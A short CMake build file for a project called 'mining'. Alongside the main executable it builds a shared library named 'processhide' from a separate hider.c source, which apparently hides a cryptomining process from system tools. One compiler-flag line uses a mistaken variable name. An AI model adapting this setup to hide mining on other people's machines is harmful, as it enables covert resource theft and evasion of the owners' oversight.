cmake_minimum_required(VERSION 3.21)
project(mining)

set(CMAKE_CXX_STANDARD 14)

include_directories(include)
set(CMAKE_VERBOSE_MAKEFILE ON)
set ( CMAKE_C_FLAGS_C_FLAGS "${CMAKE_C_FLAGS} -ldl")
add_library(processhide SHARED ../hider/hider.c)
set_property(TARGET processhide PROPERTY POSITION_INDEPENDENT_CODE ON)

add_executable(mining main.cpp)

